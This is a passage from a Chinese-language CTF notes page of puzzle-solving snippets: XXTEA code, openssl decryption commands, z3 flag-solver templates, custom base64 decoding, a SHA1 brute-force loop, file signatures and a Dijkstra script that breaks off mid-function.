<h2 id="xxtea"><a href="#xxtea" class="headerlink" title="xxtea"></a>xxtea</h2><p>解密与加密脚本的python实现。<a target="_blank" rel="noopener" href="https://www.cnblogs.com/DirWang/p/12198526.html">来源</a>。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">_DELTA = <span class="number">0x9E3779B9</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_long2str</span>(<span class="params">v, w</span>):</span><br><span class="line">    n = (<span class="built_in">len</span>(v) - <span class="number">1</span>) &lt;&lt; <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> w:</span><br><span class="line">        m = v[-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> (m &lt; n - <span class="number">3</span>) <span class="keyword">or</span> (m &gt; n): <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">        n = m</span><br><span class="line">    s = struct.pack(<span class="string">&#x27;&lt;%iL&#x27;</span> % <span class="built_in">len</span>(v), *v)</span><br><span class="line">    <span class="keyword">return</span> s[<span class="number">0</span>:n] <span class="keyword">if</span> w <span class="keyword">else</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_str2long</span>(<span class="params">s, w</span>):</span><br><span class="line">    n = <span class="built_in">len</span>(s)</span><br><span class="line">    m = (<span class="number">4</span> - (n &amp; <span class="number">3</span>) &amp; <span class="number">3</span>) + n</span><br><span class="line">    s = s.ljust(m, <span class="string">b&quot;\0&quot;</span>)</span><br><span class="line">    v = <span class="built_in">list</span>(struct.unpack(<span class="string">&#x27;&lt;%iL&#x27;</span> % (m &gt;&gt; <span class="number">2</span>), s))</span><br><span class="line">    <span class="keyword">if</span> w: v.append(n)</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params"><span class="built_in">str</span>, key</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span> == <span class="string">&#x27;&#x27;</span>: <span class="keyword">return</span> <span class="built_in">str</span></span><br><span class="line">    v = _str2long(<span class="built_in">str</span>, <span class="literal">True</span>)</span><br><span class="line">    k = _str2long(key.ljust(<span class="number">16</span>, <span class="string">b&quot;\0&quot;</span>), <span class="literal">False</span>)</span><br><span class="line">    n = <span class="built_in">len</span>(v) - <span class="number">1</span></span><br><span class="line">    z = v[n]</span><br><span class="line">    y = v[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">    q = <span class="number">6</span> + <span class="number">52</span> // (n + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">while</span> q &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">sum</span> = (<span class="built_in">sum</span> + _DELTA) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        e = <span class="built_in">sum</span> &gt;&gt; <span class="number">2</span> &amp; <span class="number">3</span></span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span>  <span class="built_in">range</span>(n):</span><br><span class="line">            y = v[p + <span class="number">1</span>]</span><br><span class="line">            v[p] = (v[p] + ((z &gt;&gt; <span class="number">5</span> ^ y &lt;&lt; <span class="number">2</span>) + (y &gt;&gt; <span class="number">3</span> ^ z &lt;&lt; <span class="number">4</span>) ^ (<span class="built_in">sum</span> ^ y) + (k[p &amp; <span class="number">3</span> ^ e] ^ z))) &amp; <span class="number">0xffffffff</span></span><br><span class="line">            z = v[p]</span><br><span class="line">        y = v[<span class="number">0</span>]</span><br><span class="line">        v[n] = (v[n] + ((z &gt;&gt; <span class="number">5</span> ^ y &lt;&lt; <span class="number">2</span>) + (y &gt;&gt; <span class="number">3</span> ^ z &lt;&lt; <span class="number">4</span>) ^ (<span class="built_in">sum</span> ^ y) + (k[n &amp; <span class="number">3</span> ^ e] ^ z))) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        z = v[n]</span><br><span class="line">        q -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> _long2str(v, <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params"><span class="built_in">str</span>, key</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span> == <span class="string">&#x27;&#x27;</span>: <span class="keyword">return</span> <span class="built_in">str</span></span><br><span class="line">    v = _str2long(<span class="built_in">str</span>, <span class="literal">False</span>)</span><br><span class="line">    k = _str2long(key.ljust(<span class="number">16</span>, <span class="string">b&quot;\0&quot;</span>), <span class="literal">False</span>)</span><br><span class="line">    n = <span class="built_in">len</span>(v) - <span class="number">1</span></span><br><span class="line">    z = v[n]</span><br><span class="line">    y = v[<span class="number">0</span>]</span><br><span class="line">    q = <span class="number">6</span> + <span class="number">52</span> // (n + <span class="number">1</span>)</span><br><span class="line">    <span class="built_in">sum</span> = (q * _DELTA) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">sum</span> != <span class="number">0</span>):</span><br><span class="line">        e = <span class="built_in">sum</span> &gt;&gt; <span class="number">2</span> &amp; <span class="number">3</span></span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(n, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">            z = v[p - <span class="number">1</span>]</span><br><span class="line">            v[p] = (v[p] - ((z &gt;&gt; <span class="number">5</span> ^ y &lt;&lt; <span class="number">2</span>) + (y &gt;&gt; <span class="number">3</span> ^ z &lt;&lt; <span class="number">4</span>) ^ (<span class="built_in">sum</span> ^ y) + (k[p &amp; <span class="number">3</span> ^ e] ^ z))) &amp; <span class="number">0xffffffff</span></span><br><span class="line">            y = v[p]</span><br><span class="line">        z = v[n]</span><br><span class="line">        v[<span class="number">0</span>] = (v[<span class="number">0</span>] - ((z &gt;&gt; <span class="number">5</span> ^ y &lt;&lt; <span class="number">2</span>) + (y &gt;&gt; <span class="number">3</span> ^ z &lt;&lt; <span class="number">4</span>) ^ (<span class="built_in">sum</span> ^ y) + (k[<span class="number">0</span> &amp; <span class="number">3</span> ^ e] ^ z))) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        y = v[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">sum</span> = (<span class="built_in">sum</span> - _DELTA) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">return</span> _long2str(v, <span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<h2 id="openssl解密"><a href="#openssl解密" class="headerlink" title="openssl解密"></a>openssl解密</h2><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><ul>
<li>openssl rsautl -decrypt -inkey privatekey.key -in cipher.enc -out result</li>
</ul>
<h3 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h3><ul>
<li>openssl enc -d -aes-128-cbc -md md5 -pass pass:SevenPinLock0123456 -in flag.aes128cbc</li>
<li>openssl enc -aes-256-cbc -d -in flag.enc -out res -salt -iv xxx -K xxx</li>
</ul>
<h3 id="CSR文件"><a href="#CSR文件" class="headerlink" title="CSR文件"></a>CSR文件</h3><ul>
<li>openssl req -in file.csr -noout -text</li>
</ul>
<h2 id="openssl私钥格式"><a href="#openssl私钥格式" class="headerlink" title="openssl私钥格式"></a>openssl私钥格式</h2><p>头和尾分别需要包含这两行：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>

<h2 id="批量openssl解密并合并图片"><a href="#批量openssl解密并合并图片" class="headerlink" title="批量openssl解密并合并图片"></a>批量openssl解密并合并图片</h2><p>例题：<a target="_blank" rel="noopener" href="https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/6%E7%BA%A7/Misc/Mysterious-GIF.md">Mysterious-GIF</a></p>
<h2 id="uncompyle6反编译pyc"><a href="#uncompyle6反编译pyc" class="headerlink" title="uncompyle6反编译pyc"></a>uncompyle6反编译pyc</h2><ul>
<li>uncompyle6 -o result.py ctf.pyc</li>
<li>uncompyle6的一个fork，可处理一些uncompyle6无法反编译的高版本pyc： <a target="_blank" rel="noopener" href="https://github.com/rocky/python-decompile3">https://github.com/rocky/python-decompile3</a></li>
</ul>
<h2 id="读取两个文件内容并xor"><a href="#读取两个文件内容并xor" class="headerlink" title="读取两个文件内容并xor"></a>读取两个文件内容并xor</h2><p>要求两个文件内容长度一致。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;a.txt&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data1=f.read()</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;b.txt&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data2=f.read()</span><br><span class="line"><span class="built_in">print</span>(strxor(data1.encode(),data2.encode()))</span><br></pre></td></tr></table></figure>

<h2 id="简单z3使用"><a href="#简单z3使用" class="headerlink" title="简单z3使用"></a>简单z3使用</h2><p>z3默认只会给出一个解，如果想要全部的解可以像下面这样：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#https://stackoverflow.com/questions/13395391/z3-finding-all-satisfying-models</span></span><br><span class="line"><span class="keyword">while</span> s.check() == z3.sat:  </span><br><span class="line">    solution = <span class="string">&quot;False&quot;</span></span><br><span class="line">    m = s.model()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">        solution = <span class="string">f&quot;Or((<span class="subst">&#123;i&#125;</span> != <span class="subst">&#123;m[i]&#125;</span>), <span class="subst">&#123;solution&#125;</span>)&quot;</span></span><br><span class="line">    f2 = <span class="built_in">eval</span>(solution)</span><br><span class="line">    s.add(f2)</span><br></pre></td></tr></table></figure>

<p>例题1:<a target="_blank" rel="noopener" href="https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/moectf/Reverse/EquationPy.md">EquationPy</a>。例题2(z3的BitVec的使用,可使用异或位移等操作):<a target="_blank" rel="noopener" href="https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/moectf/Crypto/ezhash.md">ezhash</a></p>
<p>再给出一个求解flag的模板脚本。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = []</span><br><span class="line">s_length=<span class="number">25</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(s_length):</span><br><span class="line">    <span class="comment">#有的时候BitVec不行可以换Int，说不定能出来。前提是没有BitVec独有的操作</span></span><br><span class="line">    byte = BitVec(<span class="string">&quot;%s&quot;</span> % i, <span class="number">8</span>)</span><br><span class="line">    s.append(byte)</span><br><span class="line"></span><br><span class="line">z = Solver()</span><br><span class="line"></span><br><span class="line"><span class="comment">#这里写约束</span></span><br><span class="line"></span><br><span class="line">flag_format = <span class="string">&quot;flag&#123;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag_format)):</span><br><span class="line">    z.add(s[i] == <span class="built_in">ord</span>(flag_format[i]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># check if all chars would be ascii printable</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag_format),s_length):</span><br><span class="line">     z.add(s[i] &gt;= <span class="built_in">ord</span>(<span class="string">&#x27;!&#x27;</span>))</span><br><span class="line">     z.add(s[i] &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;~&#x27;</span>))</span><br><span class="line">     </span><br><span class="line"><span class="comment"># chack if the last char would be &quot;&#125;&quot;</span></span><br><span class="line">z.add(s[-<span class="number">1</span>] == <span class="built_in">ord</span>(<span class="string">&#x27;&#125;&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># check if z3 can solve it</span></span><br><span class="line"><span class="keyword">if</span> z.check() == sat:</span><br><span class="line">    solution = z.model()</span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, s_length):</span><br><span class="line">        flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">str</span>(solution[s[i]])))</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Check if z3 can&#x27;t solve it</span></span><br><span class="line"><span class="keyword">elif</span> z.check() == unsat:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Failed:&quot;</span> + <span class="built_in">str</span>(z.check()))</span><br></pre></td></tr></table></figure>

<ul>
<li><a target="_blank" rel="noopener" href="https://meashiri.github.io/ctf-writeups/posts/202307-cryptoctf/#blue-office">https://meashiri.github.io/ctf-writeups/posts/202307-cryptoctf/#blue-office</a> ：Extract函数使用. <code>Extract(high, low, expr)</code>:<ul>
<li>high is the index of the highest bit to extract.</li>
<li>low is the index of the lowest bit to extract.</li>
<li>expr is the expression from which the bits are to be extracted.</li>
</ul>
</li>
</ul>
<h2 id="python3实现换表base64解密"><a href="#python3实现换表base64解密" class="headerlink" title="python3实现换表base64解密"></a>python3实现换表base64解密</h2><p>此脚本为题目<a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/challenges/details?hash=ebe1d9bb-662e-4922-a257-828d58e2a4aa_2&task_category_id=6">easyjni</a>的解题脚本。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line">data=<span class="built_in">list</span>(<span class="string">&#x27;MbT3sQgX039i3g==AQOoMQFPskB1Bsc7&#x27;</span>)</span><br><span class="line">index=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(data),<span class="number">2</span>):</span><br><span class="line">	data[i],data[i+<span class="number">1</span>]=data[i+<span class="number">1</span>],data[i]</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span>.join(data[<span class="number">16</span>:]+data[:<span class="number">16</span>])</span><br><span class="line">STANDARD_ALPHABET = <span class="string">b&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">CUSTOM_ALPHABET = <span class="string">b&#x27;i5jLW7S0GX6uf1cv3ny4q8es2Q+bdkYgKOIT/tAxUrFlVPzhmow9BHCMDpEaJRZN&#x27;</span></span><br><span class="line">DECODE_TRANS = <span class="built_in">bytes</span>.maketrans(CUSTOM_ALPHABET, STANDARD_ALPHABET)</span><br><span class="line"><span class="built_in">print</span>(b64decode(flag.translate(DECODE_TRANS)))</span><br></pre></td></tr></table></figure>

<p>换表后题目给出的字符不全就要用itertools爆破，比如：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line">cipher=<span class="string">b&#x27;MyLkTaP3FaA7KOWjTmKkVjWjVzKjdeNvTnAjoH9iZOIvTeHbvD==&#x27;</span></span><br><span class="line">STANDARD_ALPHABET = <span class="string">b&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> itertools.permutations(<span class="string">b&quot;ju34&quot;</span>,<span class="number">4</span>):</span><br><span class="line">    s=<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(j) <span class="keyword">for</span> j <span class="keyword">in</span> i])</span><br><span class="line">    CUSTOM_ALPHABET = <span class="string">b&#x27;JASGBWcQPRXEFLbCDIlmnHUVKTYZdMovwipatNOefghq56rs&#x27;</span>+s.encode()+<span class="string">b&#x27;kxyz012789+/&#x27;</span></span><br><span class="line">    DECODE_TRANS = <span class="built_in">bytes</span>.maketrans(CUSTOM_ALPHABET, STANDARD_ALPHABET)</span><br><span class="line">    <span class="built_in">print</span>(b64decode(cipher.translate(DECODE_TRANS)))</span><br></pre></td></tr></table></figure>

<p>例题：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[WUSTCTF2020]B@se">[WUSTCTF2020]B@se</a></p>
<h2 id="python爆破sha1值"><a href="#python爆破sha1值" class="headerlink" title="python爆破sha1值"></a>python爆破sha1值</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42967398/article/details/96492843">来源</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;@DBApp&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100000</span>,<span class="number">999999</span>):</span><br><span class="line">	s = <span class="built_in">str</span>(i)+flag</span><br><span class="line">	x = hashlib.sha1(s.encode())</span><br><span class="line">	cnt = x.hexdigest()</span><br><span class="line">	<span class="keyword">if</span> <span class="string">&quot;6e32d0943418c2c&quot;</span> <span class="keyword">in</span> cnt:</span><br><span class="line">		<span class="built_in">print</span>(cnt)</span><br><span class="line">		<span class="built_in">print</span>(<span class="built_in">str</span>(i)+flag)</span><br></pre></td></tr></table></figure>

<h2 id="常见文件文件头、文件尾"><a href="#常见文件文件头、文件尾" class="headerlink" title="常见文件文件头、文件尾"></a>常见文件文件头、文件尾</h2><p><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/List_of_file_signatures">链接</a></p>
<p>补充：</p>
<ul>
<li>RAR文件尾：C4 3D 7B 00 40 07 00</li>
<li>jpg文件尾：FF D9</li>
<li>encrypto加密软件加密文件的文件头：4D 50 45 31(MPE1)，后缀.crypto</li>
<li><a target="_blank" rel="noopener" href="https://github.com/marcobellaccini/pyAesCrypt">pyAesCrypt</a>模块密文文件：41 45 53 02。提供一个解密脚本：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pyAesCrypt</span><br><span class="line">buffersize=<span class="number">0</span></span><br><span class="line">password=<span class="string">&#x27;&#x27;</span></span><br><span class="line">pyAesCrypt.decryptFile(<span class="string">&quot;cipher.enc&quot;</span>,<span class="string">&quot;plain&quot;</span>,password,buffersize)</span><br></pre></td></tr></table></figure>

<ul>
<li>png文件尾:AE 42 60 82</li>
<li>rec后缀文件，文件头<code>AMR#</code>,strings这类文件可得到<a target="_blank" rel="noopener" href="https://automacrorecorder.com/">Auto Mouse Recorder</a>。可以用官网下载软件播放该文件</li>
<li><a target="_blank" rel="noopener" href="https://github.com/M0R1AR7Y/Writeups/tree/main/MAPNA%202024/JigBoy">JigBoy</a><ul>
<li>JBIG（后缀<code>jbg</code>,<code>jbg2</code>）文件头：<code>97 4A 42 32 0D 0A 1A 0A</code></li>
<li>其他wp： <a target="_blank" rel="noopener" href="https://github.com/Jonnen98cool/CTF_writeups/blob/main/mapna_ctf_2024/JigBoy.md">https://github.com/Jonnen98cool/CTF_writeups/blob/main/mapna_ctf_2024/JigBoy.md</a></li>
</ul>
</li>
<li><a target="_blank" rel="noopener" href="https://github.com/Apzyte-Gamer/MapnaCTF-2024/tree/main/Forensics/XXG">XXG</a><ul>
<li>gimp xcf文件分析。注意xcf文件的版本过高也会导致文件无法打开。一般用的是v011</li>
<li>详细文件头格式参考 <a target="_blank" rel="noopener" href="https://developer.gimp.org/core/standards/xcf/#header">https://developer.gimp.org/core/standards/xcf/#header</a></li>
</ul>
</li>
<li>MFT文件头：<code>FILE0</code></li>
</ul>
<h2 id="C语言格式化字符串参考"><a href="#C语言格式化字符串参考" class="headerlink" title="C语言格式化字符串参考"></a>C语言格式化字符串参考</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/chenmozhe22/article/details/109738852">链接</a></p>
<h2 id="serpent分组加密算法"><a href="#serpent分组加密算法" class="headerlink" title="serpent分组加密算法"></a>serpent分组加密算法</h2><p>详情见大佬<a target="_blank" rel="noopener" href="https://blog.csdn.net/douqingl/article/details/50256931">博客</a>。可使用<a target="_blank" rel="noopener" href="https://www.tools4noobs.com/online_tools/decrypt/">在线网站</a>直接解密。</p>
<h2 id="exif查看"><a href="#exif查看" class="headerlink" title="exif查看"></a>exif查看</h2><p>misc或者osint题型中，可能会有信息藏在exif头中。使用<a target="_blank" rel="noopener" href="https://exif.tools/upload.php">在线工具</a>查看。</p>
<h2 id="dijkstra最短路径寻路算法"><a href="#dijkstra最短路径寻路算法" class="headerlink" title="dijkstra最短路径寻路算法"></a>dijkstra最短路径寻路算法</h2><p>例题：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#%E6%95%91%E4%B8%96%E6%8D%B7%E5%BE%84">救世捷径</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#dijkstra算法</span></span><br><span class="line">graph=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">27</span>):</span><br><span class="line">    graph.append([])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">27</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">27</span>):</span><br><span class="line">        graph[i].append(<span class="number">0x3f3f3f</span>)</span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;dj.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).readlines()<span class="comment">#这里需要手动将原文中的最后一行换行给去掉</span></span><br><span class="line">li=[]</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> f:</span><br><span class="line">    li.append(x.strip().split(<span class="string">&#x27; &#x27;</span>))</span><br><span class="line"><span class="comment">#print(li)</span></span><br><span class="line"><span class="comment">#print(graph)</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> li:</span><br><span class="line">    graph[<span class="built_in">int</span>(x[<span class="number">0</span>])][<span class="built_in">int</span>(x[<span class="number">1</span>])]=<span class="built_in">int</span>(x[<span class="number">2</span>])</span><br><span class="line">    graph[<span class="built_in">int</span>(x[<span class="number">1</span>])][<span class="built_in">int</span>(x[<span class="number">0</span>])]=<span class="built_in">int</span>(x[<span class="number">2</span>])</span><br><span class="line"><span class="comment">#print(graph)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dijkstra</span>():</span><br><span class="line">    dv=[<span class="number">0x3f3f3f</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">27</span>)]<span class="comment">#点i到起点1的最短距离</span></span><br><span class="line">    route=[<span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">27</span>)]<span class="comment">#记录每点和与它对应的上一点</span></span><br><span class="line">    vis=[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">27</span>)]<span class="comment">#各点到起点的最短距离是否已定.</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="number">27</span>):</span><br><span class="line">        dv[i]=graph[i][<span class="number">1</span>]</span><br><span class="line">    dv[<span class="number">1</span>]=<span class="number">0</span></span><br><span class="line">    <span class="comment">#print(dv)</span></span><br><span class="line">    vis[<span class="number">1</span>]=<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">        minn=<span class="number">0x3f3f3f</span></span><br><span class="line">        temp=-<span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="number">27</span>):</span><br><span class="line">            <span class="keyword">if</span> vis[j]==<span class="number">0</span> <span class="keyword">and</span> minn&gt;dv[j]:</span><br><span class="line">                minn=dv[j]</span><br><span class="line">                temp=j</span><br><span class="line">        vis[temp]=<span class="number">1</span></span><br><span class="line">        <span class="comment">#print(temp)</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="number">27</span>):</span><br><span class="line">            <span class="keyword">if</span> dv[j]&gt;dv[temp]+graph[temp][j]:</span><br><span class="line">                dv[j]=dv[temp]+graph[temp][j]</span><br><span class="line">                route[j]=temp</span><br><span class="line">    